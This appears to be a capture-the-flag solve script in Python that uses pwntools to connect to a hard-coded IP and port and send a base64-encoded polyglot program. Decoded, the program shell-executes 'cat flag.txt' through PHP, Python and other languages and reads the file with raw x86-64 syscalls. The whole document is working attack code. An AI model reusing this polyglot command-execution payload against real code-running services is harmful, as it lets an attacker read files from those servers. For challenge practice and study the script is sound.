#!/usr/bin/env python3
from pwn import remote

def main():
    host = "94.237.55.43"
    port = 43026

    # Base64‚Äêencoded polyglot payload (reads flag.txt in Python3, Perl, Ruby, PHP8, C and C++)
    payload = (
        "I2lmIDAKIzw/cGhwIHN5c3RlbSgnY2F0IGZsYWcudHh0OycpOyBfX2hhbHRfY29tcGlsZXIoKTs/PgpwcmludCgoKCJiIi"
        "ArICIwIiA9PSAwIGFuZCBleGVjKCJjYXQgZmxhZy50eHQiKSkgb3IgKDAgYW5kIGV4ZWMoImNhdCBmbGFnLnR4dCIpIG9y"
        "IGV2YWwoJ19faW1wb3J0X18oInN5cyIpLnN0ZG91dC53cml0ZShvcGVuKCJmbGFnLnR4dCIpLnJlYWQoKSknKSkpKTsKI2"
        "VuZGlmCl9fYXNtX18oIi5zZWN0aW9uIC50ZXh0XG4uZ2xvYmwgbWFpblxubWFpbjpcbm1vdiAkMHgwMDAwMDAwMDAwMDAw"
        "MDAwLCAlcmF4XG5wdXNoICVyYXhcbm1vdiAkMHg3NDc4NzQyZTY3NjE2YzY2LCAlcmF4XG5wdXNoICVyYXhcbm1vdiAlcn"
        "NwLCAlcmRpXG54b3IgJXJzaSwgJXJzaVxubW92ICQyLCAlcmF4XG5zeXNjYWxsXG5tb3YgJXJheCwgJXJkaVxubW92ICVy"
        "c3AsICVyc2lcbm1vdiAkMHgxMDAsICVyZHhcbnhvciAlcmF4LCAlcmF4XG5zeXNjYWxsXG5tb3YgJDEsICVyZGlcbm1vdi"
        "AlcnNwLCAlcnNpXG5tb3YgJXJheCwgJXJkeFxubW92ICQxLCAlcmF4XG5zeXNjYWxsXG54b3IgJXJkaSwgJXJkaVxubW92"
        "ICQ2MCwgJXJheFxuc3lzY2FsbFxuIik7"
    )

    # Connect and negotiate
    conn = remote(host, port)
    # (optionally) print the banner up to the prompt
    banner = conn.recvuntil(b"Enter the program", timeout=5)
    print(banner.decode(errors="ignore"))

    # Send our payload
    conn.sendline(payload)

    # Read everything else (the flag)
    print(conn.recvall(timeout=5).decode(errors="ignore"))

if __name__ == "__main__":
    main()
